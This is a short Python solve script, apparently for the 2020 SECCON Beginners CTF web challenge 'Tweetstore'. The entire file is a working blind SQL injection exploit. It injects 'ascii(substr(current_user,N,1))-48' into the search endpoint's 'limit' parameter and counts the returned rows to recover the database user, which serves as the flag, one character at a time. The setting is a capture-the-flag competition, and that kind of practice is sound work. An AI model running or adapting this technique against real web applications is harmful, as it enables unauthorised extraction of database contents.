#!/usr/bin/python3
# -*- coding:utf-8 -*-

#ctf4b2020-web-Tweetstore

import requests

URL = "https://tweetstore.quals.beginners.seccon.jp/"
flag = ""

for i in range(40):
    r = requests.get(
        URL,
        params = {
            "search":"",
            "limit":"ascii(substr(current_user,{},1))-48".format(len(flag)+1)
        },
    )
    count = r.text.count("Watch@Twitter")
    flag += chr(count + 48)
    if('}' != chr(count + 48)):
     print(flag)
    else:
     break

print()
print('FLAG: ' + flag)
